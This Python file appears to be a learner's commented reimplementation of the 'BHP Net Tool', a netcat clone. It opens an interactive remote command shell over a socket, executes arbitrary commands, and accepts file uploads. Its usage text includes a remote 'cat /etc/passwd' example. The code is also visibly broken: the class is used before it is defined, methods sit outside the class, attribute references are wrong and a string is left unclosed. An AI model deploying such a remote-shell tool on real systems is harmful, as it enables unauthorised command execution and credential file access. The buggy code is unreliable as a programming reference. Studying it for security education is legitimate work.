import argparse #takes the arguments passed to skript when in is run from the command line
import socket
import shlex #simple lexical analysis
import subprocess# runs Python program processes
import sys #methods, that allow you to work with different elements of the Python runtime environment
import textwrap #module can be used to format text in situations where beautiful printing is required
import threading #Multithreading

#receives a command, executes it, and returns it as a string
def execute(cmd):
    cmd = cmd.strip() #removes spaces
    if not cmd:
        return
    #interaction with client programs...executes a command in the local operating system and returns output of this command
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    #split()- splits the string, using a syntax, simular to a terminal shell
    #srderr- error output stream>>> STDOUT- this is output stream(execute)

    return output.decode()

"""THE MAIN UNIT"""
if __name__ == "__main__":
    #creating a command line interface>>>ArgumentParser- pulling arguments
    parser = argparse.ArgumentParser(description='BHP Net Tool', formatter_class=argparse.RawDescriptionHelpFormatter)
    #formatter_class- it can be used to display a help message as a single block of text
    epilog = textwrap.dedent('''Example:                             
        netcat.py -t 192.168.1.108 -p 5555 -i -c #command shell
        netcat.py -t 192.168.1.108 -p 5555 -i -u=mytest.txt
        #download file
        netcat.py -t 192.168.1.108 -p 5555 -i -e=\"cat /etc/passwd\
        #executed command
        echo  'ABC' | ./netcat.py -t 192.168.1.108 -p 135
        #send text to the server port 135
        netcat.py -t 192.168.1.108 -p 5555
        #connect with server''')
    #dedent - left-alignet text
    #We also provide application help, when the user launches the program with options --help

    #six arguments, that determine the behaior of the program
    parser.add_argument('-c', '--command', action='store_true', help='command shell') #action-how arguments should be handled... if the argument is used, it takes the value True
    #-c -prepares an interactive command shell
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen') #We need to prepare the listener
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port') #port with interaction
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specidied IP')# sets the IP
    parser.add_argument('-u', '--upload', help="upload file" )
    #adding information to the command line

    args = parser.parse_args()  #starts the parser and puts the extracted data into the object

    if args.listen: #if the program is a listener
        buffer = ""
    else:
        buffer = sys.stdin.read()
        #stdin - used for all interactive input data.(input)
    
nc = NetCat(args, buffer.encode())
nc.run()

class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
    
    def run(self):#the run method serves as the entry point for managing the NetCat object
        #we delegation execution to other method
        if self.args.listen:
            self.listen()
        else:
            self.send()

def send(self):
    self.socket.connect((self.args.target, self.args.port)) #make a connection
    if self.buffer:
        self.socket.send(self.buffer) #transmitted buffer

    try:  #will we need to close the connection mannualy Ctrl+c
        while True: #receive data from the target server
            recv_len=1 #the device is ready to receive
            response = ''
            while recv_len:
                data = self.socket.recv(4096)
                recv_len = len(data) # list lenght????
                response += data.decode()
                if recv_len < 4096:
                    break #if there is no data, we leave the list
            if response:
                print(response)
                buffer = input('>')  #receiving interactive input
                buffer += "\n"
                self.socket.send(buffer.encode())# send and continue the cycle
    except KeyboardInterrupt:# exception when trying to stop the program (Ctrl+c)
        print("User terminated") 
        self.socket.close()
        sys.exit()
    
def listen(self):
    self.socket.bind((self.socket.target, self.socket.port)) #listening side
    self.socket.listen(5)
    while True:
        client_socket, = self.socket.accept() #runtime listening
        client_thread = threading.Thread(target=self.handle, args=(client_socket,))
        client_thread.start()
    
#Now let's implement the logic for loading files, executing command, and creating interactive command shell
def handle(self, client_socket):
    if self.args.execute:
        output = execute(self.args.execute)  #pacces to execut function and sends output to the socket
        client_socket.send(output.encode)

    elif self.args.upload:
        file_buffer = b""
#we enter a loop to receive data from the listening socket until it stops coming
        while True:
            data = client_socket.recv(4096)
            if data:
                file_buffer += data
            else:
                break

#write the accumulated contents to a file
        with open(self.args.upload, 'wb') as f:
            f.write(file_buffer)
        message = f"Saved file {self.args.upload}"
        client_socket.send(message.encode())

    elif self.args.command: #creating command shell
        cmd_buffer = b""
        while True:
            try:
                client_socket.send(b"BHP: #> ") #invite command string
                while "\n" not in cmd_buffer.decode(): #the command shell waits for a line feed a signal
                    cmd_buffer += client_socket.recv(64)
                response = execute(cmd_buffer.decode()) #runtime command by using "execute"
                if response:
                    client_socket.send(response.decode())
                cmd_buffer = b""
            except Exception as e:
                print(f'server killed {e}')
                self.socket.close()
                sys.exit()






















    
